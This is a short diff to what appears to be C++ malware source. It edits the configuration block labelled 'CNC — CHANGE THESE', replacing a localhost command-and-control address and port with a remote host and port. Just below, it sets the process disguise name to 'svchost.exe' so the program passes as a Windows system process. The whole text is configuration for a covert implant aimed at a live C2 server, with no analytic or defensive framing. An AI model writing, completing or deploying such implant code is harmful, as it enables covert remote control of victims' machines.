@@ -60,8 +60,8 @@ static void store_plaintext(Id id, const char* str) {
 void init() {
     std::call_once(g_init_flag, []() {
         // === CNC — CHANGE THESE ===
-        store_plaintext(Id::CNC_DOMAIN,    "127.0.0.1");
-        store_plaintext(Id::CNC_PORT,      "19443");
+        store_plaintext(Id::CNC_DOMAIN,    "hayabusa.proxy.rlwy.net");
+        store_plaintext(Id::CNC_PORT,      "33191");
 
         // === process disguise ===
         store_plaintext(Id::PROC_NAME,     "svchost.exe");
